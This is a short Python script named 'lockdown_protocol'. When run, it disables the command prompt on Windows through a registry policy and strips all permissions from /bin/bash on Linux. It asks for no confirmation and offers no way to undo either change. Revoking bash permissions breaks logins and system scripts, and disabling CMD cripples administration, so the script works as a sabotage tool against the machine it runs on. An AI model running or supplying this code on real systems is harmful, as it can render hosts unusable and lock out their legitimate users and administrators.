
import os
import platform

def lockdown_protocol():
    print("[+] Initiating lockdown protocol...")

    system = platform.system()

    if system == "Windows":
        try:
            os.system("reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f")
            print("[+] CMD disabled on Windows.")
        except Exception as e:
            print(f"[!] Failed to disable CMD: {e}")

    elif system == "Linux":
        try:
            bash_path = "/bin/bash"
            if os.path.exists(bash_path):
                os.chmod(bash_path, 0o000)
                print("[+] Bash access disabled on Linux.")
        except Exception as e:
            print(f"[!] Failed to disable shell: {e}")
    else:
        print("[!] Unsupported OS for lockdown.")

# For standalone test
if __name__ == "__main__":
    lockdown_protocol()
